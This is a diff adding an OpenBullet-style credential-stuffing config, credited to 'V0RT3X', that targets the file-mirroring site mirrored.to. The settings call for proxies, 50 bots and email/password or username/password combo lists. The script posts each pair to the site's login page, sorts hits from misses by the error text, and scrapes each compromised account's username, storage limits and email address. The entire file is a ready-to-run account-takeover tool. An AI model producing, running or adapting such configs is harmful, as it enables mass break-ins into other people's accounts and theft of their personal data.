@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "Mirrored.to || V0RT3X",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-01T20:43:29.308318+01:00",
+  "AdditionalInfo": "",
+  "Author": "V0RT3X",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 5,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.mirrored.to/account/login_.php?lang=en" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "1" 
+  KEYCHAIN Failure OR 
+    KEY "<p class=\"unsuccessful double-margin double-padded centered\">Incorrect login details - Please try again</p>" 
+REQUEST GET "https://www.mirrored.to" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<h6 class=\"right\">Hi, <b>" "</b>&nbsp;<a href=\"/p/log-out\"><u>(logout?)</u></a></h6>" -> CAP "Username" 
+REQUEST GET "https://www.mirrored.to/p/summary" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<div class=\"even\"><b>Maximum Mirrors</b> : " "</div>" -> CAP "Max Mirrors" 
+PARSE "<SOURCE>" LR "<div class=\"even\"><b>Maximum File size</b> : " "</div>" -> CAP "Maximum File size" 
+REQUEST GET "https://www.mirrored.to/p/setting" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<div class=\"even\"><b>Email</b> : " "</div>" -> CAP "Email" 
